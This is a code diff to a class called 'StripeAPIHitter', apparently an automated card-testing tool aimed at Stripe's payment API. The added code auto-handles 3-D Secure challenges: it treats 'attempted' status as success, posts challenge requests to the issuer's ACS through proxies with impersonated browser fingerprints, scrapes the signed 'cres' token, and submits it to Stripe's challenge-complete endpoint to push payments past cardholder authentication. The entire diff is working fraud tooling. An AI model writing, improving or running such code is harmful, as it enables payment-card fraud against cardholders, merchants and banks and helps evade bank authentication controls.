@@ -1921,8 +1921,44 @@ class StripeAPIHitter:
                                             state = auth_json.get("state")
                                             ares = auth_json.get("ares", {}) or {}
                                             trans_status = ares.get("transStatus")
-                                            if state in ["succeeded", "authenticated"] or trans_status in ["Y", "A"]:
+                                            if state in ["succeeded", "authenticated"]:
+                                                break
+                                            
+                                            # Parse transStatus from ARes — 'A' (attempted) counts as frictionless success
+                                            if trans_status in ["Y", "A"]:
                                                 state = "authenticated"
+                                                break
+                                                
+                                            # Handle ACS Challenge verification & signed cres parsing
+                                            acs_url = ares.get("acsURL") or auth_json.get("acs_url")
+                                            creq = ares.get("cReq") or auth_json.get("creq")
+                                            
+                                            if acs_url and creq:
+                                                try:
+                                                    acs_headers = {
+                                                        "User-Agent": profile["user_agent"],
+                                                        "Content-Type": "application/x-www-form-urlencoded"
+                                                    }
+                                                    acs_resp = await loop.run_in_executor(None, lambda: cffi_requests.post(
+                                                        acs_url, data={"creq": creq}, headers=acs_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                                    
+                                                    comp_url = "https://api.stripe.com/v1/3ds2/challenge/complete"
+                                                    comp_data = {"source": source, "key": pk}
+                                                    if acs_resp and acs_resp.status_code == 200:
+                                                        import re as _re_cres
+                                                        cres_match = _re_cres.search(r'name=["\']cres["\']\s+value=["\']([^"\']+)["\']', acs_resp.text, _re_cres.I)
+                                                        if cres_match:
+                                                            comp_data["cres"] = cres_match.group(1)
+                                                        
+                                                        await loop.run_in_executor(None, lambda: cffi_requests.post(
+                                                            comp_url, data=comp_data, headers=auth_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                                except Exception:
+                                                    pass
+                                            
+                                            if trans_status in ["N", "R"]:
+                                                break
+                                                
+                                            if state in ["succeeded", "authenticated", "challenge_required"]:
                                                 break
                                         except Exception:
                                             continue
